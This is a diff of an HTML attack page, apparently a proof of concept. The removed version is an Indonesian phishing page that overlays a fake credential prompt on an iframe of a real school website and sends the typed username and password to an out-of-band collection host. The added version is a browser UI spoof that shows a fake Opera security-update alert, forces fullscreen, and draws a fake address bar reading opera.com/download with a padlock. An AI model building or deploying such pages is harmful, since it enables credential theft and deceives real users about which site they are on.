@@ -1,67 +1,123 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Situs Penyerang</title>
+    <title>Security UI Spoof</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
     <style>
-        #maliciousFrame {
-            position: fixed;
-            top: 0;
-            left: 0;
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #spoof {
             width: 100%;
             height: 100%;
-            border: none;
-            z-index: 9999;
+            object-fit: cover;
+            display: none;
         }
-        .overlay-prompt {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
+        
+        #content {
             padding: 20px;
-            border: 2px solid #007bff;
+            text-align: center;
+        }
+        
+        .opera-link {
+            color: #ffcc00;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 24px;
+            border: 2px solid #ffcc00;
+            padding: 15px 30px;
             border-radius: 10px;
-            z-index: 10000;
-            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            display: inline-block;
+            margin-top: 30px;
+            transition: all 0.3s ease;
+        }
+        
+        .opera-link:hover {
+            background: #ffcc00;
+            color: #cc0000;
+        }
+        
+        .warning {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px;
+            border-left: 5px solid #ffcc00;
         }
     </style>
-</head>
-<body>
-    <h1>Selamat datang di situs kami</h1>
-    <p>Ini adalah situs yang tampak normal...</p>
-    
-    <!-- Iframe yang menginjeksi domain target -->
-    <iframe id="maliciousFrame" src="https://sman12depok-jabar.sch.id/"></iframe>
-    
-    <!-- Prompt palsu yang muncul di atas iframe -->
-    <div class="overlay-prompt" id="fakePrompt">
-        <h3>Verifikasi Keamanan Diperlukan</h3>
-        <p>Masukkan kredensial Anda untuk melanjutkan:</p>
-        <input type="text" placeholder="Username" id="username">
-        <input type="password" placeholder="Password" id="password">
-        <button onclick="stealCredentials()">Submit</button>
-    </div>
-
     <script>
-        // Script untuk menangani pencurian kredensial
-        function stealCredentials() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Kirim kredensial ke server penyerang
-            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-                method: 'POST',
-                body: JSON.stringify({username, password})
-            });
-            
-            alert('Terima kasih! Kredensial telah diverifikasi.');
-            document.getElementById('fakePrompt').style.display = 'none';
+        function activateSpoof() {
+            setTimeout(() => {
+                // Hide legitimate content
+                document.getElementById("content").style.display = "none";
+                
+                // Show spoofed image/content
+                document.getElementById("spoof").style.display = "block";
+                
+                // Activate fullscreen to hide address bar
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.msRequestFullscreen) {
+                    document.documentElement.msRequestFullscreen();
+                }
+                
+                // Additional manipulation after fullscreen
+                setTimeout(() => {
+                    // Simulate browser UI changes
+                    document.title = "Opera Browser - Download";
+                    // Could add fake address bar here
+                    createFakeAddressBar();
+                }, 100);
+                
+            }, 500);
         }
-
-        // Tampilkan prompt setelah beberapa detik
-        setTimeout(() => {
-            document.getElementById('fakePrompt').style.display = 'block';
-        }, 3000);
+        
+        function createFakeAddressBar() {
+            const fakeBar = document.createElement('div');
+            fakeBar.innerHTML = `
+                <div style="position: fixed; top: 0; left: 0; right: 0; background: #2c2c2c; padding: 10px; border-bottom: 1px solid #555; z-index: 10000;">
+                    <div style="display: flex; align-items: center;">
+                        <div style="color: white; margin-right: 10px;">🔒</div>
+                        <div style="color: white; font-family: monospace; font-size: 14px;">https://www.opera.com/download</div>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(fakeBar);
+        }
     </script>
+</head>  
+<body>
+    <!-- Spoofed content (hidden initially) -->
+    <img id="spoof" style="display: none;" src="https://via.placeholder.com/800x1200/1e3a8a/ffffff?text=Opera+Browser+Official+Download+Page" alt="Fake Opera Page">
+    
+    <!-- Initial legitimate-looking content -->
+    <div id="content">
+        <div class="warning">
+            <h2>⚠️ Security Alert</h2>
+            <p>Your Opera browser needs an important security update.</p>
+            <p>Click the link below to download the latest secure version.</p>
+        </div>
+        
+        <br><br>
+        
+        <h1>Navigate to Opera Official Site</h1>
+        <a href="#" class="opera-link" onclick="activateSpoof()">https://www.opera.com/download</a>
+        
+        <div style="margin-top: 50px; font-size: 14px; opacity: 0.8;">
+            <p>🔒 Secure Connection | Official Opera Software</p>
+        </div>
+    </div>
 </body>
 </html>
